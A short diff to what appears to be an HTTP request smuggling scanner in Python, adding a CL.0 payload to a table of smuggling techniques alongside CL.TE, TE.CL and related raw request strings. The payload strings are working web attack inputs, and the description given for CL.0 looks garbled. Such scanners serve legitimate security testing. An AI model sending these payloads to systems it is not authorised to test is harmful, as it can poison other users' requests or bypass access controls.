@@ -11,6 +11,7 @@ urllib3.disable_warnings(InsecureRequestWarning)
 
 # define common payloads
 PAYLOAD_CLTE = "0\r\nSMUGGLE\r\n"
+PAYLOAD_CL0 = "GET / HTTP/1.1\r\nContent-Length: 4\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nSMUGGLE"
 PAYLOAD_SLRE = "POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ: X\r\n\r\n"
 PAYLOAD_TECL = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\n0\r\n\r\n"
 PAYLOAD_TESI = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n5\r\nhello\r\n0\r\n\r\n"
@@ -18,6 +19,7 @@ PAYLOAD_TESI = "GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nContent-Length: 
 # define techniques to check
 TECHNIQUES = {
     "CLTE": ("Content-Length and Transfer-Encoding", "Content-Length: 7\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" + PAYLOAD_CLTE),
+    "CL.0": ("Content-Length with a body ending in .0", PAYLOAD_CL0),
     "SLRE": ("Space before chunked-length and\r\n\r\n after chunked-data", PAYLOAD_SLRE + PAYLOAD_CLTE),
     "TECL": ("Transfer-Encoding and Content-Length", "Transfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\n0\r\n\r\n"),
     "TESI": ("Transfer-Encoding with a body ending in\r\n\r\n and chunked with no trailers", PAYLOAD_TESI),
